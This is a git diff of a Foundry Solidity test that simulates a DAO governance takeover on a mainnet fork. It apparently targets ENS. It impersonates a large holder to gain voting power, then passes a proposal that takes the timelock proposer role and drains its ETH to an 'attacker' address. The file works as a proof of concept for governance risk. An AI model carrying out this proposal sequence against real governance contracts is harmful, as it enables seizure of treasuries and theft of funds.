@@ -14,7 +14,7 @@ contract CounterTest is Test {
     bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
     bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
 
-    address voter = address(0x1);
+    address attacker = address(0x1);
 
     function setUp() public {
         vm.createSelectFork({ blockNumber: 19_618_708, urlOrAlias: "mainnet" });
@@ -37,9 +37,9 @@ contract CounterTest is Test {
     function test_AttackDAO() public {
         // Delegate from top token holder (binance, with 4m $ENS in this case)
         vm.prank(0x5a52E96BAcdaBb82fd05763E25335261B270Efcb);
-        token.delegate(voter);
+        token.delegate(attacker);
 
-        uint256 votingPower = token.getVotes(voter);
+        uint256 votingPower = token.getVotes(attacker);
         assertEq(votingPower, 4_126_912_192_000_000_000_000_000);
 
         // Need to advance 1 block for delegation to be valid on governor
@@ -49,13 +49,13 @@ contract CounterTest is Test {
         address[] memory targets = new address[](3);
         targets[0] = address(timelock);
         targets[1] = address(timelock);
-        targets[2] = voter;
+        targets[2] = attacker;
         uint256[] memory values = new uint256[](3);
         values[0] = 0;
         values[1] = 0;
         values[2] = 5_370_845_482_402_118_767_544;
         bytes[] memory calldatas = new bytes[](3);
-        calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), voter));
+        calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), attacker));
         calldatas[1] = abi.encodeCall(timelock.revokeRole, (timelock.PROPOSER_ROLE(), address(governor)));
         calldatas[2] = bytes("");
 
@@ -64,7 +64,7 @@ contract CounterTest is Test {
 
         // Governor //
         // Submit malicious proposal
-        vm.prank(voter);
+        vm.prank(attacker);
         uint256 proposalId = governor.propose(targets, values, calldatas, description);
         assertEq(governor.state(proposalId), 0);
 
@@ -73,7 +73,7 @@ contract CounterTest is Test {
         assertEq(governor.state(proposalId), 1);
 
         // Vote for the proposal
-        vm.prank(voter);
+        vm.prank(attacker);
         governor.castVote(proposalId, 1);
 
         // Let the voting end
@@ -97,7 +97,7 @@ contract CounterTest is Test {
         assertTrue(timelock.isOperationDone(proposalIdInTimelock));
 
         // Check result
-        assertTrue(timelock.hasRole(PROPOSER_ROLE, voter));
+        assertTrue(timelock.hasRole(PROPOSER_ROLE, attacker));
         assertFalse(timelock.hasRole(PROPOSER_ROLE, address(governor)));
         assertEq(address(timelock).balance, 0);
 
@@ -108,9 +108,8 @@ contract CounterTest is Test {
 
     /// @dev Labels the most relevant addresses.
     function labelAddresses() internal {
-        vm.label({ account: voter, newLabel: "VOTER" });
+        vm.label({ account: attacker, newLabel: "attacker" });
         vm.label({ account: address(governor), newLabel: "governor" });
-        vm.label({ account: address(timelock), newLabel: "timelock" });
         vm.label({ account: address(timelock), newLabel: "timelock" });
         vm.label({ account: address(token), newLabel: "token" });
     }
